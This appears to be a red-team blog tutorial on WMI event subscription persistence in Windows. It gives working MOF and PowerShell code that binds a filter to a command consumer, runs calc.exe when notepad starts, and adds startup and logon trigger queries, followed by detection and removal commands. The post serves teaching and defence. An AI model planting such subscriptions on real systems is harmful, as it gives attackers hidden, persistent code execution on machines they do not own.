---
title: "WMI Event Subscription"
date: 2023-03-23T12:48:00+03:30
tags: ['security','RedTeam', 'Persistence', 'Privilege-Escalation']
categories: ['security', 'RedTeam']
images: ['/assets/post/WMI-ES/mof.png']
description: 'In this post, we will talk about WMI event subscription and its use methods by red teams.'
---

Windows Management Instrumentation (WMI) event subscription is one way to establish persistence on a network.
In this post, we will talk about WMI event subscription and its use methods by red teams.

## Overview

Microsoft describes this feature as follows:
WMI contains an event infrastructure that produces notifications about changes in `WMI` data and services. WMI event classes provide notification when specific events occur.

Persistence via WMI event sharing usually requires the creation of the following three classes:

the `EventConsumer` class to store the desired command

the `__EventFilter` class to specify the event that triggers the load

the `__FilterToConsumerBinding` class to communicate between the first two classes, thus executing and triggering the connection are used together.

## Abuse

There are different ways to create a WMI event subscription. In this post, two methods, `MOF` files and `PowerShell` are examined.

### MOF

Managed Object Format (MOF) is the language used to describe Common Information Model (CIM) classes.

One approach for WMI providers is to implement new WMI classes in MOF files that are compiled into the WMI repository using Mofcomp.exe. It is also possible to create and manipulate CIM classes and instances using the COM API for WMI.

```bash
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
instance of CommandLineEventConsumer as $Cons
{
    Name = "Consumer-test";
    RunInteractively=false;
    CommandLineTemplate="calc.exe";
};
instance of __EventFilter as $Filt
{
    Name = "Event-test";
    EventNamespace = "root\\subscription";
    Query ="SELECT * FROM __InstanceCreationEvent Within 3"
            "Where TargetInstance Isa \"Win32_Process\" "
            "And Targetinstance.Name = \"notepad.exe\" ";
    QueryLanguage = "WQL";
};
instance of __FilterToConsumerBinding
{
     Filter = $Filt;
     Consumer = $Cons;
};
```

The above MOF file executes `calc.exe` when the `notepad.exe` process is created on the system. The MOF file can be deployed to the WMI repository by running the following command:

```
mofcomp.exe .\wmi.mof
```

![Mof File](/assets/post/WMI-ES/mof.png)

### PowerShell

In PowerShell, there are cmdlets to create a WMI event subscription, which you can see in the example below.

```PowerShell
$EventFilterName = "Event-test"
$EventConsumerName = "Consumer-test"

$Payload = "calc.exe"

$EventFilterArgs = @{
   EventNamespace = 'root/cimv2'
   Name = $EventFilterName
   Query = "SELECT * FROM __InstanceCreationEvent Within 3 Where TargetInstance Isa 'Win32_Process' And Targetinstance.Name = 'notepad.exe' "
   QueryLanguage = 'WQL'
}

Write-Host "[*] Create Filter"
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

$CommandLineConsumerArgs = @{
   Name = $EventConsumerName
   CommandLineTemplate = $Payload
}

Write-Host "[*] Create Consumer"
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

$FilterToConsumerArgs = @{
   Filter = $Filter
   Consumer = $Consumer
}

Write-Host "[*] Create FilterToConsumerBinding"
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
```

The function of this powershell code is the same as the previous part, if notepad is opened, it will run the calculator.

![Powershell](/assets/post/WMI-ES/powershell.png)

Apart from this query, we can write other useful queries, for example define filters for `Startup` or `UserLogon`.

```sql
# Startup

SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325

# UserLogon

SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2
```

## Detection
There are several ways to detect pre-recorded events. One of these ways is to use PowerShell cmdlets to display logged events.

```PowerShell
Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer
```
![Powershell](/assets/post/WMI-ES/consumer.png)
```powershell
Get-WMIObject -Namespace root/Subscription -Class __EventFilter
```
![Powershell](/assets/post/WMI-ES/filter.png)
```PowerShell
Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding
```
![Powershell](/assets/post/WMI-ES/bind.png)

## Removal
You can delete created events and filters using the following commands.

> The names of the created events and filters may be different

```PowerShell
#Remove Event Filters

Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Event-test'" | Remove-WmiObject -Verbose

#Remove Consumers

Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Consumer-test'" | Remove-WmiObject -Verbose

#Remove Bindings

Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%test%'" | Remove-WmiObject -Verbose
```

## References

* [Receiving a WMI Event](https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-a-wmi-event)
* [Managed Object Format (MOF)](https://learn.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-)
* [Persistence – WMI Event Subscription](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)
* [An intro into abusing and identifying WMI Event Subscriptions for persistence](https://in.security/2019/04/03/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/)
* [Event Triggered Execution: Windows Management Instrumentation Event Subscription ](https://attack.mitre.org/techniques/T1546/003/)
